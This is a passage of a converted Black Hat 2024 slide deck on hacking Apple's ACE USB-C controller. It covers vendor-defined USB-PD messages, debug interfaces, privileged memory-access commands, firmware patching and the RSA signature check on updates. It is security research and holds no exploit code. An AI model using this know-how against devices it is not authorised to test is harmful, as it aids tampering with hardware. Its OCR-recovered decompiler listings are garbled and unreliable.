---
title: "ACE Up the Sleeve Hacking Into Apple's New USB-C Controller"
speakers: ["Thomas Roth"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Thomas Roth_ACE Up the Sleeve Hacking Into Apple's New USB-C Controller.pdf"
pages: 223
sha256: "edfc9e3233e1ca8c9cd32a0231842004c81162a95dca993d5c6e2edad84c9abf"
text_chars: 70649
ocr_pages: 60
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:42:34Z"
---
# ACE Up the Sleeve Hacking Into Apple's New USB-C Controller

**Speakers:** Thomas Roth  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Thomas Roth_ACE Up the Sleeve Hacking Into Apple's New USB-C Controller.pdf` (223 pages)

## Slide 1

ACE up the Sleeve Hacking into Apple's new USB-C controller

## Slide 2

###### whoami

###### Thomas Roth aka stacksmashing

Security researcher - Hardware & Firmware Co-founder at hextree.io

Twitter: @ghidraninja YouTube: @stacksmashing

**hextree** .io

## Slide 3

###### Thanks

Carlo Maragno Marc Zyngier (maz) T8012 Dev Team

Siguza Carlo Maragno Marc Zyngier (maz) Oly (Thunderbolt Patcher) T8012 Dev Team AsahiLinux Team aunali1 Carlo Maragno h0m3us3r Jiska, Fabian & Caro mrarm Rick Mark

**hextree** .io

## Slide 4

###### The backstory…

**hextree** .io

## Slide 5

**hextree** .io

## Slide 6

**hextree** .io

## Slide 7

###### The obvious stuff

###### Charging USB Video & Audio

**hextree** .io

## Slide 8

###### The obvious stuff The cool stuff

###### Charging USB

Video & Audio

JTAG UART SDQ

**hextree** .io

## Slide 9

###### The cool stuff

###### Tamarin Cable

###### JTAG UART SDQ

**hextree** .io

## Slide 10

## Slide 11

**hextree** .io

## Slide 12

###### **The cool stuff?**

**hextree** .io

## Slide 13

**hextree** .io

## Slide 14

**hextree** .io

## Slide 15

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ono feat evsus] cor] o- | o- [sevijeushmoaaxae| ovo
(exo [RRR [veus|seu2] o- | o- [oca Pause BaR] ow
hextree.io
```

## Slide 16

**hextree** .io

## Slide 17

###### USB-PD Negotiation

**hextree** .io

## Slide 18

###### USB-PD Negotiation

USB-C Port
Controller

**hextree** .io

## Slide 19

**hextree** .io

## Slide 20

###### Configuration Channel

**hextree** .io

## Slide 21

All handled by the USB-C Port (Micro)controller Configuration Channel

**hextree** .io

## Slide 22

Photo by h0m3us3r Thanks T8012 Dev Team! **hextree** .io

## Slide 23

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ web.archive.org
https://blog.t8012.dev/ace-part-1/
30 captures
) Dee 2020 - 23 Oct 20. ¥ About this capture
The T2 Development
Home Blo Contact Store
Blog 9 oy
USB-PD
ACE: Apple Type-C Port
Controller Secrets | Part 1
Exposing Apple's Vendor Defined Messaging protocol, AppleVDM, built on USB-
PD.
@9 hextree.io
```

## Slide 24

## VDM

**hextree** .io

## Slide 25

## VDM Vendor Defined Messages

**hextree** .io

## Slide 26

## VDM Vendor Defined Messages

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WADI
Vendor Defined Messages
COO Dr YSBPO_R20V1S - 20170112.pat ®@ QQH 2+ BF @ EF & vendor defined °
Sort By: |S@areh Rank Page Order Found on 46 pages {< | >} [Done
6.4.4 Vendor Defined Message
The Vendor_Defined Message (VDM) is provided to allow vendors to exchange information outside of that defined by
this specification.
A Vendor_Defined Message Shall consist of at least one Vendor Data Object, the VDM Header, and May contain up to a
maximum of six additional VDM Objects (VDO).
To ensure vendor uniqueness of Vendor_Defined Messages, all Vendor_Defined Messages Shall contain a Valid USB
Standard or Vendor ID (SVID) allocated by USB-IF in the VDM Header.
Two types of Vendor_Defined Messages are defined: Structured VDMs and Unstructured VDMs. A Structured VDM
defines an extensible structure designed to support Modal Operation. An Unstructured VDM does not define any
structure and Messages May be created in any manner that the vendor chooses.
Vendor_Defined Messages Shall Not be used for direct power negotiation. They May however be used to alter Local
Policy, affecting what is offered or consumed via the normal PD Messages. For example a Vendor_Defined Message ts hextree . {@)
could be used to enable the Source to offer additional power via a Source_Capabilities Message.
```

## Slide 27

## VDM Vendor Defined Messages

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
fg web.archive.org
https://blog.t8012.dev/ace-part-1/
30 captures
30 Dec 2020 - 23 Oct 202
Protocol Summary
With the code above available, it is possible to finally sum up how this
protocol works. All messages must come from SOP'DBG or SOP''DBG .
AppleVDM @x1®@ : Get Action List
Input: { @x5AC80@10 }
Reply: Shorts encoded using VDM (first short in high 16 bytes, second in low
16 bytes). Zero terminated.
Example reply VDOs: @5020702 06060206 01060105 02030103
08000000
AppleVDM @x11 : Get Action Info
Parameters:
x
uint16_t ActionId - specifies the action, taken from 0x10 reply
nextree.io
```

## Slide 28

**hextree** .io

## Slide 29

######

######

**hextree** .io

## Slide 30

###### VDM action 0x306

######

**hextree** .io

## Slide 31

**hextree** .io

## Slide 32

**hextree** .io

## Slide 33

## Type-C Port Controller

**hextree** .io

## Slide 34

## Type-C Port Controller

ACE

**hextree** .io

## Slide 35

## Type-C Port Controller

ACE
ACE2
ACE3

**hextree** .io

## Slide 36

## Type-C Port Controller

ACE
System
on
Chip

**hextree** .io

## Slide 37

## Type-C Port Controller

USB & Thunderbolt
ACE
System
on
Chip

**hextree** .io

## Slide 38

## Type-C Port Controller

USB & Thunderbolt
ACE
System
Serial console
on
Chip

**hextree** .io

## Slide 39

## Type-C Port Controller

USB & Thunderbolt
ACE
System
Serial console
on
& more!
Chip

**hextree** .io

## Slide 40

But how can we send VDM?

**hextree** .io

## Slide 41

###### How can we send VDM?

macvdmtool Back-left port of MacBook Pro to get serial etc Central Scrutinizer Hardware tool to get serial console on MacBook

**hextree** .io

## Slide 42

###### Tamarin-C

Allows bi-directional access to internal busses JTAG probe integrated Discovered SPMI on iPhone 15 & M3 Pro/Max

**hextree** .io

## Slide 43

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Baan y
nks to the Central Scrutin
eesvc gee res
fess eas! leeslese!
|
a
$4 +0 -0 98 200018 t1G0No |
n |
ONes
:
d Baidu bh)
eee
;
```

## Slide 44

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
View Window Help: a@eaweoterragce
) « picocom -q /dev/cu.usbmodem313371 5 build git:(mein) x picocom -q OS ol chen |
N 6
Wa
ae
my
or >
|
N
aie
—-
or
Ee
5
bs
```

## Slide 45

# The ACE2

**hextree** .io

## Slide 46

###### ACE2

CD3217 - USB-C / PD Controller

Arm-based and connected via I2C Found on MacBooks starting with the T2

**hextree** .io

## Slide 47

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
fan)
[] -
TPS65986-etcTl.pdf
Page 1 of 111
1
wr Sample &
es Buy
TEXAS
INSTRUMENTS
Tools & Support &
Software Community
TPS65986
R 5
TPS65986 USB Type-C and USB PD Controller and Power Switch
Features
USB Power-Delivery (PD) Controller
— Mode Configuration for Source (Host), Sink
(Device), or Source-Sink
— Bi-Phase Marked Encoding/Decoding (BMC)
— Physical Layer (PHY) Protocol
— Policy Engine
- Configurable at Boot and Host-Controlled
USB Type-C Specification Compliant
— Detect USB Cable-Plug Attach
— Cable Orientation and Role Detection
— Assign CC and VCONN Pins
— Advertise Default, 1.5 A, or 3 A for Type-C
Power
Port Power Switch
— 6, 3-A Switch to VBUS for Type-C Power
- 5-V to 20-V, 3-A Bidirectional Switch to or from
VBUS for USB PD Power
— 5, 600-mA Switches for VCONN
— Overcurrent Limiter, Overvoltage Protector
— Slew-Rate Control
— Hard Reset Support
Port Data Termination
— USB 2.0 Low-Speed Endpoint
Power Management
— Power Supply from 3.3 V or VBUS Source
— 3.3-V LDO Output for Dead Battery Support
BGA MicroStar Junior Package
— 0.5-mm Pitch
3 Description
The TPS65986 device is a stand-alone USB Type-C
and power delivery (PD) controller providing cable-
plug and orientation detection at the USB Type-C
connector. Upon cable detection, the TPS65986
device communicates on the CC wire using the USB
PD protocol. When cable detection and USB PD
negotiation are complete, the TPS65986 device
enables the appropriate power path and configures
alternate mode settings for (optional) extemal
multiplexers.
The mixed-signal front end on the CC pins advertises
default (900 mA), 1.5 A, or 3 A for Type-C power
sources, detects a plug event and determines the
USB Type-C cable orientation, and autonomously
negotiates USB PD contracts by adhering to the
specified bi-phase marked coding (BMC) and
physical layer (PHY) protocol.
The port power switch passes up to 3 A downstream
at 5 V for legacy and Type-C USB power. An
additional bi-directional switch path provides USB PD
power up to 3 A at a maximum of 20 V as either a
source (host), sink (device), or source-sink.
The TPS65986 device is also an upstream-facing port
(UFP). downstream-facing port (DFP), or dual-role
port for data. The port data termination passes data
to or fram the top or bottom D+/D— signal pair to the
USB 2.0 low-speed endpoint The power
management circuitry uses a 3.3-V power supply
inside the system and also uses VBUS to start up
and negotiate power from a dead battery or no
battery condition.
Device Information”
BODY SIZE (NOM)
@ hextree.io
```

## Slide 48

**hextree** .io

## Slide 49

###### Identified commandhandler

###### Contains "privileged" commands MEMr/MEMw/MEMm

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
eee © ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
CP & ace_combined.oin.bnab +
Peg Types Search types
Mapped» Linear~ High Level il +
Name * Size @xz9beB
{i} y User Types: ace_combined.bin.bndb songpies chor none|éx4] = *IECS*
a ES 00029bec void (* hardler)(int92_t, int32_t) = sub_206c6
GS struct. @x15 e0e29bfe 7
@ struct_2 axa pe29bfe [0x41] =
0] System Types: ace_combined.bin.bndb 9p029bfa {
a Platform: thumb2 e9e29bfe char nane|@x4] = “HIPD"
ege29bT4 void (* handler)(int32_t, int32_t) = sub 286c6
fe yer Ap829b8 }
= Identified command- =| P
Fes 09029bf8 {
90029bfa char nane|@x4] - 'DFUf"
00029bfc void (* handler)(int32_t, int32_t) = sub_251«2
h ie 99029cea }
a al e r 00029¢88 [0x43] =
struct command_nandler __packed 90029¢00 {
Et] { 00029¢88 char nane|éx4] = ‘NENr"
00 char nene[ 0x4]; 08029¢84 void (* handler) (int32_t, int32_t) = handle_menr
4 void (* handler) (int32_t, int32_t); 90029c88 ;
oe i 8029¢88 (exaa] =
= Contains "privileged Ee
| 88829¢8c void (* handler)(int32_t, int32_t) = handle_memr
00029¢18 }
09029014 [0x46] =
00029018 {
CO! ! I ! la al S 000629¢18 char name|@x4] = ‘MENm"
00029¢14 void (* handler)(int32_t, int32_t) = handle_memr
00029¢18 7
00029C18 [@x46] =
0062918 {
Cross References 2 09029018 char nane|éx4] = ‘ycot”
> Fiter (0) ABB29CTC void (* handler) (int37_t, 1nt3?_t) = sub_77H62
= MEMr/MEMw/MEMm ae
00029¢28 (0x47) =
00029¢20 {
99029¢2G char nane|6x4] = 'VCOn"
00029¢24 void (* handler)(int32_t, int32_t) = sub_270€2
00029¢28 }
00029¢28 [@x48] =
00029¢28 {
00029c28 char nane|@x4] = ‘CRST"
88829¢2C void (* handler)(int32_t, 11132_t) = sub_266c2
00829038 }
A827 9¢34 {ax4g) =
200710090
@90 ZC — thumb2 _0x29a00-0x29a04 [0x4 bytes] A
@ hextree.io
```

## Slide 50

###### Identified commandhandler

###### Contains "privileged" commands MEMr/MEMw/MEMm

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
eee © ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
#% Types Q Search types — = Mapped~ Lineary High Level IL ~ Oc = _ (x)
| “gers; [8x43] = e
. Pn char name[@x4] = "MEMr" =
m Identified command- 5 void (* handler)(int32_t, int32_t) = handle_memr
handler c ‘oxaa] _ ;
char n
voit {
8 };
= Contains "privileged" char name[@x4] = "MEMw"
d void (* handler) (int32_t, int32_t)
commands }
cosrewen LOX45] =
ge MEMr/MEMw/MEMm mee
handle_memr
char name[@x4] = "MEMm"
void (* handler) (int32_t, int32_t) = handle_memr =
} bie
a : : Liens s
®30 &A20 thumb2 0x29a00-0x29a04 (0x4 bytes} a
2)
3)
sa)
@ hextree.io
```

## Slide 51

###### Apple HPM Bus

Internal interface to talk to I2C Used by HPMDiagnose & co Can be used to communicate with ACE

**hextree** .io

## Slide 52

###### FourCC Commands Different registers that can be written/read to/from 4-digit integer/ASCII commands Commands in register 9, Status in 3 acetool - Tool to communicate with ACE

**hextree** .io

## Slide 53

FourCC Commands Different registers that can be written/read to/from 4-digit integer/ASCII commands Commands in register 9, Status in 3 acetool - Tool to communicate with ACE

**hextree** .io

## Slide 54

**hextree** .io

## Slide 55

SPI Flash

**hextree** .io

## Slide 56

Send firmware
via UART

SPI Flash

**hextree** .io

## Slide 57

###### ACE2: SPI Flash

Does not contain full firmware Contains "patches" for the ROM Makes reversing… annoying

SPI Flash

**hextree** .io

## Slide 58

**hextree** .io

## Slide 59

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
@602275a int32_t var_18 = r3
66022766 — char* r5 = *(arg2 + 4)
86822762 void* r6 = nullptr
0022766 — void* r4 = nullptr
8002276e data_2@0443c5 = (zx.d(*r5) << @xle u>> @x1e).b
80022776 *r5 = (zx.d(*r5) << @xlce u>> Oxic).b
46822788 data_1@@@206@8 = data_19602608 & Oxffffffbf -
80022792 int32_t r2_2 = data_190@048c 90029308 EES EEL
| : @08293c8 int32_t r1_1
46822796 uint32_t r@_5 = r2_2 << @x1@ u>> @x18 .
. @00293c8 int32_t r2
@002279c uint32_t r7 = zx.d(r2_2.b) @00293c8 int32_t r3
@082279e uint32_t r1_2 = zx.d(data_200443c5) c antec. F
880293c8 r@_1, r1_1, r2, r3 = data_286@41894(arg1)
00623606 return sub_e@(r@_1, r1_1, r2, r3)
& hextree.io
```

## Slide 60

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
@602275a int32_t var_18 = r3
668227660 — char* r5 = *(arg2 + 4)
86822762 void* r6 = nullptr
0022766 — void* r4 = nullptr
8002276e data_2@0443c5 = (zx.d(*r5) << @xle u>> @x1e).b
60022776 *r5 = (zx.d(*r5) << @xlce u>> @x1c).b
200277851] = 6 a coezsabs ints + sub 2eabecines tarat)
46822788 data_1@@@206@8 = data_19602608 & Oxffffffbf -
80022792 int32_t r2_2 = data_190@048c 90029308 EES EEL
| : @08293c8 int32_t r1_1
46822796 uint32_t r@_5 = r2_2 << @x1@ u>> @x18 .
. @00293c8 int32_t r2
@002279c uint32_t r7 = zx.d(r2_2.b) @00293c8 int32_t r3
@082279e uint32_t r1_2 = zx.d(data_200443c5) c antec. F
880293c8 r@_1, r1_1, r2, r3 = data_286@41894(arg1)
00623606 return sub_e@(r@_1, r1_1, r2, r3)
2004188c void* data_2@04188c = sub_21f22
20041898 void* data_2004189@ = sub_21f40
20041898 void* data_260041898 = sub_22146
2004189c void* data_2004189c = sub_22186
& hextree.io
```

## Slide 61

###### Loaded from flash into RAM

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
8082275a
80822768
86822762
80822766
4682276e
80022776
88822778
46822788
80022792
46822796
8002279c
4682279e
int32_t var_18 = r3
char* r5 = *(arg2 + 4)
void* r6 = nullptr
void* r4 = nullptr
data_2@0443c5 = (zx.d(*r5) << @xle u>> @xle).b
*r5 = (zx.d(*r5) << @xlce u>> Oxic).b
data_1@@@206@8 = data_19602608 & Oxffffffbf
int32_t r2_2 = data_1000048c
uint32_t r@_5 = r2_2 << @x1@ u>> @x18
uint32_t r7 = zx.d(r2_2.b)
uint32_t r1_2 = zx.d(data_20@443c5)
000293c8
@68293c8
@88293c8
888293c8
880293c8
00023606
Loaded from flash
into RAM
2004188c
20041890
20041894
20041898
2004189c
int32_t r@_1
int32_t r1_1
int32_t r2
int32_t r3
r@_1, r1_1, r2, r3 = data_286@41894(arg1)
return sub_e@(r@_1, r1_1, r2, r3)
void*
void*
data_2004188c
data_20041890
void* data_20041894 =
void*
void*
data_20041898
data_2004189c
Tp 2002938 ints? + cub_298be(ints2t argt)
sub_21f22
sub_21f48
sub_220c@
sub_22146
sub_22186
@ hextree.io
```

## Slide 62

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
@602275a int32_t var_18 = r3
668227660 — char* r5 = *(arg2 + 4)
86822762 void* r6 = nullptr
0022766 — void* r4 = nullptr
8002276e data_2@0443c5 = (zx.d(*r5) << @xle u>> @x1e).b
60022776 *r5 = (zx.d(*r5) << @xlce u>> @x1c).b
200277851] = 6 a coezsabs ints + sub 2eabecines tarat)
46822788 data_1@@@206@8 = data_19602608 & Oxffffffbf -
80022792 int32_t r2_2 = data_190@048c 90029308 EES EEL
| : @08293c8 int32_t r1_1
46822796 uint32_t r@_5 = r2_2 << @x1@ u>> @x18 .
. @00293c8 int32_t r2
@002279c uint32_t r7 = zx.d(r2_2.b) @00293c8 int32_t r3
@082279e uint32_t r1_2 = zx.d(data_200443c5) c antec. F
880293c8 r@_1, r1_1, r2, r3 = data_286@41894(arg1)
00623606 return sub_e@(r@_1, r1_1, r2, r3)
2004188c void* data_2@04188c = sub_21f22
20041898 void* data_2004189@ = sub_21f40
20041898 void* data_260041898 = sub_22146
2004189c void* data_2004189c = sub_22186
& hextree.io
```

## Slide 63

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
8082275a
80822768
86822762
80822766
4682276e
80022776
86822778
int32_t var_18 = r3
char® r5 = *(arg2 + 4)
void* r6 = nullptr
void* r4 = nullptr
data_2@0443c5 = (zx.d(*r5) << @xle u>> @xle).b
*r5 = (zx.d(*r5) << @xlce u>> Oxic).b
000293c8
@68293c8
@88293c8
888293c8
880293c8
00023606
46922788 data_1@0@2068 = data_19@02008 & Oxffffffbf
86822792 int32_t r2_2 = data_1000048c
80822796 uint32_t r@_5 = r2_2 << @x18 u>> @x18
0082279c uint32_t r7 = zx.d(r2_2.b)
@682279e uint32_t r1_2 = zx.d(data_20@443c5)
608220c8 void sub_22@c@(int32_t arg1)
006228ce if (arg1 == @)
608228ce *@x40050818 = 1
000226fa data_100@2@08 = data_100@2008 | @x4@
00822102 data_100@2@04 = Oxeabe@ae1
0682210c while (data_18082000 << @x1d s>= @)
6082218c nop
00622116 return
998220d2 if (argi == 1)
00822112 *@x40@50818 = 1
0082211e data_18062608 = data_10002008 | 8x40
00622126 data_10062604 = @xeabeG0e1
60622130 while (data_180@2000 << @x1ld s>=
00822138 nop
00822136 data_100@2004 = Oxeabegae2
00822140 while (data_18082000 << @x1c s>=
00622140 nop
00622144 return
900220d6 if (argl == 2)
608226da data_160@2@04 = @xeabe@aed
00822064 *8x40850818 = 8
2004188c
20041890
20041894
20041898
"TS SRE SEEZS
int32_t r@_1
int32_t r1_1
int32_t r2
int32_t r3
Tp 2002938 ints? + cub_298be(ints2t argt)
r@_1, r1_1, r2, r3 = data_20@41894(arg1)
return sub_e@(r@_1, r1_1, r2, r3)
void* data_2004188c
void* data_20041890
void* data_20041894 =
void* data_20041898
void* data_2004189c
sub_21f22
sub_21f48
sub_220c@
sub_22146
sub_22186
@ hextree.io
```

## Slide 64

Can be in ROM or RAM (if patched)

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
Tp 2002938 ints? + cub_298be(ints2t argt)
int32_t r@_1
int32_t r1_1
int32_t r2
int32_t rd
r@_1, r1_1, r2, r3 = data_20041894(arg1)
return sub_e@(r@_1, r1_1, r2, r3)
void*
void*
void*
void*
void*
data_2004188c
data_20041890
data_20041894 =
data_20041898
data_2004189c
RAM (if patched)
@602275a int32_t var_18 = r3
86622768 char* r5 = *(arg2 + 4)
86822762 void* r6 = nullptr
86822766 void* r4 = nullptr
082276e data_2@@443c5 = (zx.d(*r5) << @xle u>> @x1e).b
80022776 *r5 = (zx.d(*r5) << @xlc u>> Ox1c).b
86022778 r5[1] = @
9@02277¢ =» Sub129368(2)
40022788 data_1698206@8 = data_19@02008 & Oxffffffbf 800293c8
88822792 int32_t r2_2 = data_1600048c 9@0293c8
40022796 uint32_t r@_5 = r2_2 << @x18 u>> @x18 900293c8
@602279c uint32_t r7 = zx.d(r2_2.b)
@882279e uint32_t r1_2 = zx.d(data_200443c5) [Melee Ses
888293c8
06023606
608220c8 void sub_22@c@(int32_t arg1)
000220ce if (arg1 == @)
@08226ece — *@x40050018 = 1
000226fa data_100@2@08 = data_100@2008 | @x4@ 2004188c
00822102 data_100@2@04 = Oxeabe@ae1
0682218c while (data_18082000 << @x1d s>= @) 20041898
0982210c nop 20041894
60622110 return 26041898
@@0220d2 if (argl == 1)
90822112 | *@x40050018 = 1 "TS zene 1ER¢
Q882211e | data_18062608 = data_10002008 | 8x40
00822126 data_10062004 = @xeabe001
00622130 | while (data_180@2000 << @x1d s>= @)
00822130 | nop
00822136 | data_100@2@04 = @xeabe@ae2 ___
068221408 while (data_18062000 << @x1c s>= @) 1
00622144 © return
908220d6 if (argl == 2)
6@8220da | data_10082004 = @xeabeabad
00822064 *8x40850818 = 8
sub_21f22
sub_21f40
sub_226c0
sub_22146
sub_22186
@ hextree.io
```

## Slide 65

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
8082275a
80822768
86822762
80822766
4682276e
80022776
86822778
int32_t var_18 = r3
char® r5 = *(arg2 + 4)
void* r6 = nullptr
void* r4 = nullptr
data_2@0443c5 = (zx.d(*r5) << @xle u>> @xle).b
*r5 = (zx.d(*r5) << @xlce u>> Oxic).b
000293c8
@68293c8
@88293c8
888293c8
880293c8
00023606
46922788 data_1@0@2068 = data_19@02008 & Oxffffffbf
86822792 int32_t r2_2 = data_1000048c
80822796 uint32_t r@_5 = r2_2 << @x18 u>> @x18
0082279c uint32_t r7 = zx.d(r2_2.b)
@682279e uint32_t r1_2 = zx.d(data_20@443c5)
608220c8 void sub_22@c@(int32_t arg1)
006228ce if (arg1 == @)
608228ce *@x40050818 = 1
000226fa data_100@2@08 = data_100@2008 | @x4@
00822102 data_100@2@04 = Oxeabe@ae1
0682210c while (data_18082000 << @x1d s>= @)
6082218c nop
00622116 return
998220d2 if (argi == 1)
00822112 *@x40@50818 = 1
0082211e data_18062608 = data_10002008 | 8x40
00622126 data_10062604 = @xeabeG0e1
60622130 while (data_180@2000 << @x1ld s>=
00822138 nop
00822136 data_100@2004 = Oxeabegae2
00822140 while (data_18082000 << @x1c s>=
00622140 nop
00622144 return
900220d6 if (argl == 2)
608226da data_160@2@04 = @xeabe@aed
00822064 *8x40850818 = 8
2004188c
20041890
20041894
20041898
"TS SRE SEEZS
int32_t r@_1
int32_t r1_1
int32_t r2
int32_t r3
Tp 2002938 ints? + cub_298be(ints2t argt)
r@_1, r1_1, r2, r3 = data_20@41894(arg1)
return sub_e@(r@_1, r1_1, r2, r3)
void* data_2004188c
void* data_20041890
void* data_20041894 =
void* data_20041898
void* data_2004189c
sub_21f22
sub_21f48
sub_220c@
sub_22146
sub_22186
@ hextree.io
```

## Slide 66

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
| 200517cd void data_200517cd
~ Code References
~ sub_23660
| 0023664 return data_29040818()
{1}
{1}
{1}
void* data_2084874c =
void* data_20846756 =
void* data_20040754 =
void* data_20848758 =
void* data_2084875c =
void* data_26048766 =
void* data_20646764
void* data_20048768
void* data_2604876c
void* data_20646778
void* data_20048774
void* data_20046778
void* data_2084877c
void* data_20048786
void* data_20040784
void* data_26648788
void* data_2004878c
void* data_20648796
void* data_26848794
void* data_20846798
void* data_2064879c
void* data_208487a0
void* data_200467a4
void* data_206467a8
void* data_200487ac
void* data_206467b6
void* data_206467b4
void* data_208487b8
void* data_200487bc
void* data_200487c8
void* data_200487c4
void* data_200487c8
void* data_208487cc
void* data_200487d@
void* data_200467d4
void* data_200467d8
void* data_200487dc
void* data_200487e8
void* data_200467e4
void* data_200487e8
void* data_2004@7ec
void* data_200407f@
void* data_200407f4
void* data_200467f8
sub_83e
sub_1e2
sub_91a
sub_Sac
sub_3ba
sub_98c
sub_9b4
sub_5ec
sub_ida
sub_5d6
sub_76e
sub_1f2
sub_9c8
sub_9e8
sub_71e
sub_2084563e
sub_2084505e
sub_664
sub_594
sub_58a
sub_4de
sub_49c
sub_2084501e
sub_3e6
sub_378
sub_31e
sub_2d6
sub_27¢
sub_236
sub_a@c
sub_a16
sub_a32
sub_a68
sub_a7c
sub_bla
sub_2362
sub_c34
sub_20851848
sub_134a
sub_200511a6
sub_1764
sub_d36
sub_20051478
sub_162c
sub_cde
@ hextree.io
```

## Slide 67

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
> ~ sudo usbcfwflasher
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
Q@=
00:
00:
QQ:
QQ:
QQ:
00:
00:
QQ:
QQ:
QQ:
QQ:
00:
00:
00:
{
RID =
options
ty
};
19
19
19
19
spleore
213.
213.
3113},
19:
19
19
19
19:
19:
19:
19:
19:
19:
0;
13.
313.
213.
313.
13.
13.
13.
13.
13.
13.
897
898
898
898
898
898
898
899
912
912
912
916
916
916
—-verbose
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[ 66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
Hextree
21870978]
21870978]
21870978)
21870978)
21870978]
21870978]
21870978]
21870978]
21870978]
21870978]
21870978]
21870978]
21870978]
21870978]
Hardware Present:
{
RID:
UUID:
Name:
Version:
OTP Key Hash:
4)
F21A3208-4151-1994-C34D-9FBO99F8FB81
USB-C_HPM, 28
Q@02.170.00.15
Updates to be done:
& hextree.io
```

## Slide 68

### Updates are protected….

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
» ~ sudo usbcfwflasher
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
2024-05-08
Q@==
QQ:
00:
00:
00:
00:
QQ:
QQ:
QQ:
QQ:
QQ:
QQ:
QQ:
00:
QQ:
{
RID =
options
ty
3;
19
19
19
19
213.
213.
213.
313.
19:
19:
19:
19:
19
19
19
19
19
19
8;
13.
13.
13.
13.
3113),
3113},
213.
213.
213.
213.
Updates are protectec....
897
898
898
898
898
898
898
899
912
912
912
916
916
916
—-verbose
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[ 66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
usbcfwflasher[66217:
Hextree
21870978)
21870978)
21870978]
21870978]
21870978 |
21870978]
21870978]
21870978]
21870978]
21870978]
21870978)
21870978]
21870978]
21870978]
Hardware Present:
{
RID:
UUID:
Name:
Version:
OTP Key Hash:
4)
F21A3208-4151-1994-C34D-9FBO099F8FB81
USB-C_HPM, 28
Q02.170.00.15
Updates to be done:
& hextree.io
```

## Slide 69

### …with RSA3072

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
eee
© | eenconindtinied® ++
H% Symbols © rse e=
Name “Address Section |
{T} rsa3072  @xe@000Bfe4
rsa3072 @x00002515e
| »
Cross References 2
> Filter (3)
~ Code References {3}
~ perform_sig_check {1}
1G 08018des int32_t ré24 = rsa3e72(8d
+ sub_457fc {2}
|@ @0@8457fe void* const var_4 = rsa3A7
| 0845800 void* const var_4 = rsa397
>=}
| »
© ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
Mapped ~ Linear High Level IL - EP HD=
@ int32_t perform_sig_check(char* arg1, int32_t arg2)
06018d2e maybe_memset_segue(destination: arg1, c: 8, count: @x4@)
88818032 int32_t r@_18 = data_20843664
06018d3a if (r@_1@ == 6x143)
00018d3e data_20043a18 = 6
66618d42 data_20043a64 = r3_16 + 6x40
06018d48 data_20043a5c = data_20643e5c + 1
06018d50 if (zx.d(data_20043a18) != 6)
06018d54 *argl = 0x80
@6018d5c argi[1] = (data_23043a58.w).b + (data_20043a5c.w) .b
@¢@18d7c argi[2] = @ | ((zx.d(some_fw_update_struct?!.field_1@) + 1) << @xle u>> @xib).b | (zx.d(some_fw_update_etruct?! .f:
6€018d50 else
@6018d8a int32_t var_28_1 = @
06018d8e sha256(a1: &data_20043bf4, a2: 6x18@, a3: &public_key_hash, a4: @)
aea18d98 load_from_otp(1, &public_key_hash_from_otp, @x2@)
06018da2 int32_t r@_2@ = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: @x2@)
@6018dae char* r4_1 = load_from_otp(2, &public_key_hash_from_otp, @x23)
@6018db8 int32_t r@_21 = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: @x2@)
